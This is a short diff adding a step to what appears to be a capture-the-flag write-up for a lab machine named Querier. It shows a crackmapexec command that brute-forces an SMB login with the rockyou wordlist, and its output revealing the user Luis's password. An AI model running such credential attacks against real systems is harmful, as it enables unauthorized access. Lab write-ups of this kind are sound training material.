@@ -183,3 +183,13 @@ Shared Doc                      : No
 Hyperlinks Changed              : No
 App Version                     : 16.0300
 ```
+
+I got user credential:
+
+```bash
+crackmapexec smb 10.10.10.125 -d 'QUERIER' -u Luis -p /usr/share/wordlists/rockyou.txt 
+SMB         10.10.10.125    445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:QUERIER) (signing:False) (SMBv1:False)
+SMB         10.10.10.125    445    QUERIER          [+] QUERIER\Luis:123456 
+```
+
+---
